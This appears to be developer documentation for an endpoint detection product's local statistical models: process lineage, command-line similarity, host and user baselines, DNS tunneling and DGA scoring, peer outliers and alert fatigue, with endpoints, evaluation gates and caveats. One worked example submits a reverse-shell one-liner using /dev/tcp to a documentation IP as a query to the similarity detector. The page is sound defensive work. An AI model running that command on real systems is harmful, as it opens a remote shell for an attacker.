# Local models

Statistical models that learn from this deployment's own telemetry. No external calls, no LLM, no
cloud. Observation only: they produce scores and neighbours for analysts, never enforcement.

<!-- BEGIN behaviour-models -->
## Behaviour models

Source: `internal/edr/ml_behaviour_*.go`. Every response carries `method: "statistical, learned from
this deployment"`, the sample counts it used, and `status: "not_enough_data"` where a model refuses to
score (cold-start guard). A model below its minimum never returns a score.

### Models

| Model | What it learns | Score | Cold-start minimum |
|-------|----------------|-------|--------------------|
| Process lineage (Markov) | parent basename to child basename transition counts, per host and fleet | surprisal `-log2 P(child\|parent)`, additive smoothing 0.5 over the child vocabulary plus one unseen slot; "novel" at >= 7.0 bits | 200 transitions (fleet), 100 (host) |
| Command-line similarity | char 3-5-gram feature hashing into 2^14 dims, sqrt term weights, cosine | nearest known-bad exemplars (built at `init()` from the positive samples of process-type content rules, with rule id, technique and tactic) and the host's own history | exemplars always ready; host history needs 20 vectors |
| Per-host baselines | EWMA (alpha 0.3) mean and variance per hour-of-week slot (168) of exec count, new-destination count, file-event burst | z-score, anomalous at z >= 3.0; sd floored at max(1, 10% of mean) | 48 closed hours per metric and 4 samples in the slot |

Idle hours between two observed hours are folded as zeros (capped at one week of gap). The
new-destination metric uses a bounded hashed set of destinations per host. `GET /v1/ml/baseline` also
reports the 24 hour first-seen executables and destinations from the prevalence graph.

### How learning happens

`RegisterMLBehaviour` starts one background goroutine that, every 2 seconds, copies only the newly
appended tail of the store's process, network and file event slices (the store lock is held just for
that copy), then updates the models outside the store lock. This needs no change to the ingest path.
The tail cursor is persisted so a restart does not re-learn retained events. Each poll is capped at
50,000 events per type. State is saved atomically at most every 30 seconds.

### Endpoints (all require auth)

- `GET /v1/ml/status` sample counts and ready flags per model.
- `GET /v1/ml/lineage?host=&limit=` ranked transitions by surprisal (fleet when no host).
- `GET /v1/ml/similar?q=<command line>&host=` nearest exemplars (rule id, technique, similarity) and, with `host`, the host-history similarity.
- `GET /v1/ml/baseline?host=` per-metric slot mean/sd, last closed hour z-score, open (partial) hour, first-seen data.
- `POST /v1/ml/reset` (admin or session) discards all learned state; retained events are not re-learned.
- `POST /v1/ml/learn/replay` (admin or session) rebuilds the models from the events retained in the store.

State file: `<store>.mlbehaviour.json`, see `docs/persistence-files.md`.

### Evaluation (synthetic fixtures, enforced by tests)

`go test ./internal/edr -run 'TestML(Lineage|Similarity|Baseline)Evaluation' -v`. The tests fail if the
numbers regress below the gates shown. Numbers are from a seeded run on this repository.

| Model | Fixture | Result at the documented threshold | Test gate |
|-------|---------|------------------------------------|-----------|
| Lineage | 5,000 benign transitions (38 pairs incl. a rare long tail) for training; 5,000 held-out benign draws; 15 injected known-parent/new-child transitions (for example `winword.exe` to `powershell.exe`, `nginx` to `sh`) and 4 never-seen-parent transitions | detection 100% (known parent), **0% (never-seen parent)**; false positive rate 0.42% | detection >= 90%, FPR <= 1% |
| Command similarity | 953 exemplars from 679 process rules; 3,812 operator-style variants (other IPs/ports/hosts, `sudo` prefix and redirect, case); 57 everyday benign command lines; 1,079 near-miss negatives from the content rules that no rule matches | detection 92.3%, correct rule or technique attributed 91.8%; FPR 0% on everyday commands, **26.6% on near-miss negatives** | detection >= 80%, everyday FPR <= 2%, near-miss FPR <= 60% |
| Baselines | 8 weeks of hourly counts with a weekday/night/weekend pattern and noise; 6 weeks training, 2 weeks evaluated; 30 injected bursts (4x plus 30) | detection 100%, FPR 1.96% of clean hours at z >= 3.0 | detection >= 90%, FPR <= 3% |

### Caveats

- Synthetic data overstates real accuracy. The benign corpus is small and regular, the injected
  anomalies are clean, and the variants are mutations of the same exemplars the model was built from.
  Expect more false positives and fewer detections on real fleets; treat the scores as triage hints.
- The lineage model is conditional on the parent: a never-seen parent gets only `log2(vocabulary)`
  bits and is not flagged at 7 bits. The `parent_seen` field is returned so analysts can see this.
- Near-miss commands (for example `aws iam list-users` against `aws iam create-access-key`) look
  similar in n-gram space. The similarity score is a nearest-neighbour hint, not a verdict; it
  complements, and does not replace, the content rules.
- Hourly baselines have only about four samples per slot per month; variance is noisy early on and
  the minimum-history guard is the main protection. The open hour is partial and under-counts.
- Learning includes whatever traffic arrives, including attacker activity; a persistent attacker
  becomes part of the baseline over time. `POST /v1/ml/reset` and replay are provided for that case.
- The existing heuristic AI modules (`ai_platform.go`) are unchanged and independent.

### Per-model reference

| Model | Method | Inputs | State and caps | Below the minimum |
|---|---|---|---|---|
| Lineage | Markov chain over (parent basename, child basename), Lidstone smoothing 0.5 | process events | 64 hosts, 1,000 edges per host, 5,000 fleet edges, names cut to 64 chars | `status: "not_enough_data"`, empty `transitions`, `sample_count` and `min_samples` shown |
| Command similarity | char 3-5-gram hashed vectors (2^14 dims), cosine, "similar to known bad" at 0.70 (`mlSimThreshold`) | `q` (up to 2,048 chars); per-host history reservoir of 128 vectors (64 non-zero features each), 32 hosts | exemplars compiled at start from process-rule positive samples | `history.status: "not_enough_data"` until the host has 20 vectors; without `host=` the history block is `not_requested`; "familiar" means top similarity >= 0.9 |
| Baselines | per-host, per-metric EWMA mean/variance in 168 hour-of-week slots, z >= 3.0 | exec count, new-destination count, file-event burst; destinations tracked as a hashed set of up to 4,096 | JSON state, atomic write | a metric is not scored until 48 closed hours and 4 slot samples; the open hour is shown as partial |

Learned-event counts per kind are in `GET /v1/ml/status` (`learned_events`). Every response carries `method`.

### Worked examples

```sh
curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/status"
# {"method":"statistical, learned from this deployment","learned_events":{...},"updated":"...",
#  "models":{"lineage":{"sample_count":..,"ready":true,"status":"ok",...},
#            "command_similarity":{"exemplar_count":..,"ready":true,...},
#            "baselines":{"hosts":..,"hosts_ready":..,"min_closed_hours":48,"ready":false,"status":"not_enough_data"}}}

curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/lineage?host=ws-01&limit=5"
# {"method":..., "scope":"host", "host":"ws-01", "min_samples":100, "sample_count":412, "fleet_sample_count":9021,
#  "surprisal_threshold_bits":7, "smoothing":0.5, "status":"ok",
#  "transitions":[{"parent":"winword.exe","child":"powershell.exe","count":1,"surprisal":8.4,"fleet_surprisal":9.1,"novel":true,"parent_seen":true}]}

curl -s -G -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/similar" \
  --data-urlencode 'q=bash -i >& /dev/tcp/198.51.100.7/4444 0>&1' --data-urlencode 'host=ws-01'
# {"threshold":0.7,"exemplar_count":..,"exemplar_neighbours":[{"similarity":0.93,"rule_id":"...","technique":"T1059.004",...}],
#  "similar_to_known_bad":true,"history":{"host":"ws-01","status":"not_enough_data","sample_count":7,"min_samples":20}}

curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/baseline?host=ws-01"
```

Values above are illustrative of the shape; the numbers depend on your telemetry.

### Evaluation and limits (summary)

The numbers in the Evaluation table are from seeded synthetic fixtures and enforced as regression gates, not measured on real fleets. Concretely not covered: a never-seen parent process (0% detection by design), near-miss commands (26.6% false positives against the near-miss negatives), real traffic seasonality beyond a week-of-hours pattern, and a baseline poisoned by an attacker who is active during learning. Not-enough-data is a first-class result: a model below its minimum returns `status: "not_enough_data"` with the counts, never a score.
<!-- END behaviour-models -->

<!-- BEGIN extended-models -->
## Extended models: DNS tunneling/DGA, user baseline, peer outliers, alert fatigue

Source: `internal/edr/ml_ext_*.go`. Same rules as above: statistical, local, no network, no LLM,
observation only. Every response carries `method`, sample counts and `status: "not_enough_data"` below
the minimum; none returns a guess. State is counts and hashes only, capped, persisted to
`<store>.mlext.json` (see `docs/persistence-files.md`), and cleared by `POST /v1/ml/reset` (and rebuilt by
`POST /v1/ml/learn/replay`). The learner polls the store tail every 2 s like the behaviour models. Events
are judged by their own timestamps, never the wall clock, so the same event sequence gives the same state.

| Model | Endpoint | Inputs | Cold-start guard |
|-------|----------|--------|------------------|
| DNS tunneling / DGA burst | `GET /v1/ml/dns?host=&limit=` | `dns` telemetry queries and network events whose destination is a host name; `ScoreDomain` (domain inspector) | host needs 50 lookups before any window is flagged |
| User baseline | `GET /v1/ml/users?user=&limit=` | `auth` telemetry (user, host, hour, outcome) and process events (key `uid:N`) | 30 successful logons for hour/new-host; 100 process events for rare-process |
| Peer-group outlier | `GET /v1/ml/peers?host=&limit=` | per-host executable basename counts and destination counts | 50 process (20 network) events per host and 5 ready hosts |
| Alert fatigue | `GET /v1/ml/fatigue?rule=&candidates=1&limit=` | findings (rule health) and the feedback ledger; stateless | rule needs 10 hits in 30 days; verdict factor needs 5 decided verdicts |

### How each one scores

- **DNS.** Per host, 5 minute event-time windows. Per registrable domain a capped (128) set of hashed
  subdomains with length and entropy sums. Tunneling score = `100*(0.5*volume + 0.3*length + 0.2*entropy)`,
  volume = `clamp((distinct-10)/90)`, length = `clamp((mean_len-12)/28)`, entropy = `clamp((mean_H-2.5)/1.5)`; flagged
  at >= 60 with >= 20 distinct subdomains. DGA burst: >= 5 distinct registrable domains with
  `ScoreDomain.dga_like` in one window, score `100*(0.6*clamp(n/12)+0.4*clamp(mean/80))`, flagged at >= 50.
  Flagged windows (20 per host) carry their reasons. Late events older than the open window are counted, not folded in.
- **Users.** Logon hour is unusual when the hour and both neighbours were never seen; new host when the
  user never logged on there; rare process when the basename was never seen for that uid. An event is
  judged against state before it is learned, so only the first occurrence is flagged. Per user: 24 hour
  bins, 64 hashed hosts, 200 basenames; 256 users. Identities from auth (`user`) and process (`uid:N`) are separate.
- **Peers.** Each ready host's normalised mix is compared with the equal-weight mean of all other ready
  hosts by Jensen-Shannon divergence (log2). Divergences become robust z-scores (median, MAD, sd floor 0.02);
  outlier at z >= 3.5, score `100*clamp(z/8)`. The response lists the items most over-represented versus peers.
- **Fatigue.** Score 0-100 = weighted mean of the present factors: volume share of 30 day findings (0.25,
  full at 25%), hits per host (0.15), 7 day trend (0.10), rule-health noisy score (0.15), analyst
  verdict evidence `1 - shrunk precision` (0.35; omitted below 5 decided verdicts, coverage shown).
  Retune candidate at >= 60. Suggestions say what to do next (add verdicts before judging, scoped exception for
  concentrated hits, tighten and test when analysts reject most hits). Nothing is changed.

### Priority fusion

`GET /v1/ml/priority` gains four optional factors, each with a note and omitted with a reason when the
model has no opinion: `dns_anomaly` (0.10, a flagged window within an hour before the finding),
`user_behaviour` (0.08, deviations for the finding's `uid:N` near the finding), `peer_outlier` (0.07, `z/8`),
`rule_fatigue` (0.05, `1 - score/100`; overlaps `rule_trust`, so kept small). Weights are renormalised over
present factors as before.

### Evaluation (synthetic, seeded; enforced by tests)

`go test ./internal/edr -run 'TestML(DNS|User|Peer|Fatigue)' -v`

| Model | Fixture | Result | Test gate |
|-------|---------|--------|-----------|
| DNS | 150 trials each: warm host (80 lookups); one window of 40-120 base32 labels (56 chars) under one domain; one window of 8-22 random-letter `.com` names; 4 benign windows per trial (CDN shards, 25 everyday names fan-out, versioned update hosts) | tunneling 150/150, DGA burst 150/150, benign host false positives 0/150 | >= 95%, >= 80%, <= 5% |
| Users | 60 users: 120 training logons in 8-17h (3% shoulder hours) on 3 hosts, 300 process events from 12 tools; 600 held-out normal events with a 2% tail of 40 rare tools; injected 3 am logon on a new host plus an unseen tool | injected deviations 180/180; benign deviation rate 1.24% of 36,000 checks (mostly the rare-tool tail) | all injected, <= 2% |
| Peers | 40 fleets of 20 web and 6 db hosts plus a miner-like host (odd processes) and an exfil-like host (odd destinations) | miner 40/40, exfil 40/40; web hosts flagged 0; **all 6 db hosts flagged in every run (240/240)** | >= 90%, 0 majority-role flags |
| Fatigue | noisy rule with 26 FP verdicts, equally noisy rule with no verdicts, a healthy rule, a 3-hit rule | scores 92.4, 88.4 (coverage 0.65), 4.2, `not_enough_data`; the unlabelled rule is told to collect verdicts rather than called noise | candidate/suggestion assertions |

### Caveats

- Synthetic data overstates accuracy. The DNS fixtures are clean extremes (random base32 labels and random
  letters); real tunnels that mimic words, low-volume exfiltration, and DGAs built from dictionary words
  (`concat` style) will be missed, and CDNs/telemetry with long hashed labels (for example anti-virus or
  tracking lookups under one domain) will look like tunneling.
- The user model treats the first occurrence as the signal and then learns it. A new employee, travel,
  shift change or a new tool is a deviation by construction; an attacker active during training becomes
  normal. UTC hours only; no per-user timezone, weekday or holiday handling. Identity keys from process
  events (`uid:N`) are not linked to auth user names.
- The peer group is the whole fleet. A minority role (all six db hosts above) is always an outlier until
  role grouping exists; use the "most distinct items" to judge. Mixes use basenames and destinations, not arguments.
- Fatigue verdicts are a labelled subset chosen by analysts, not fleet precision, and analysts are noisy.
  It cannot tell a noisy rule from a rule firing on a real, ongoing incident; the "trend up" suggestion says so.
- Domain names are stored for flagged windows and in the open window (capped, 64 per window); nothing else
  retains raw DNS names. Counts only otherwise.

### Per-model reference

| Model | Method | State and caps | Not-enough-data behaviour |
|---|---|---|---|
| DNS | 300 s event-time windows, per registrable domain a hashed-subdomain set (128 per domain, 64 domains per open window), tunneling flagged at score >= 60 with >= 20 distinct subdomains, DGA burst at >= 5 DGA-like domains and score >= 50 | 20 flagged windows kept per host; 128 hosts overall | host reports `not_enough_data` until 50 lookups |
| User | first-occurrence deviations (hour, new host, rare process) judged before learning | 256 users, 24 hour bins, 64 hosts and 200 basenames per user; 20 anomalies kept per user | hour and host checks need 30 successful logons, rare-process needs 100 process events |
| Peers | Jensen-Shannon divergence of a host's mix against the mean of the other ready hosts, robust z >= 3.5 | vocabulary 200 items per host, destinations 96 | per host 50 process (20 network) events; a view needs 5 ready hosts |
| Fatigue | weighted factors over 30 days of findings plus feedback verdicts, retune candidate at score >= 60 | stateless (computed per request) | rule needs 10 hits in 30 days (`mlFatMinHits30d`), verdict factor needs 5 decided verdicts |

All four share the `<store>.mlext.json` state (version 1, saved at most every 30 s, polled every 2 s, at most 50,000 events per poll); fatigue is recomputed from findings and feedback.

### Worked examples

```sh
curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/dns?host=ws-01&limit=5"
curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/users?user=alice"
curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/peers?host=db-01"
curl -s -H "Authorization: Bearer $KAVACH_TOKEN" "http://127.0.0.1:8099/v1/ml/fatigue?candidates=1&limit=10"
# fatigue: {"method":..., "model":"alert-fatigue-v1", "mode":"observe-only", "min_hits_30d":10,
#  "retune_score_threshold":60, "min_verdicts":5, "weights":{...}, "rules_evaluated":N,
#  "rules_with_enough_data":M, "retune_candidates":K, "status":"ok"|"not_enough_data",
#  "rules":[{"rule":"...","status":"ok","score":92.4,"retune":true,...}]}
```

`?rule=<id>` returns that rule only (404 `{"error":"rule has no findings"}` when it has none). All four return `status: "not_enough_data"` with the observed counts instead of a score when the guard above is not met. Shapes beyond the fatigue envelope are described by the field names in the code (`ml_ext_*.go`); values here are illustrative.

### Fixed: extended priority factors and the score

**Fixed after v0.2.0:** the extended factors used to be computed after the weighted sum, so they never reached `score`, `coverage` or `factors`. They are now evaluated before the sum, and `TestMLExtFactorsReachPriorityScore` drives them through `ctx.score`. Scores from builds before the fix omit these four factors; v0.2.0 is affected. The `exposure` factor was never affected.
<!-- END extended-models -->
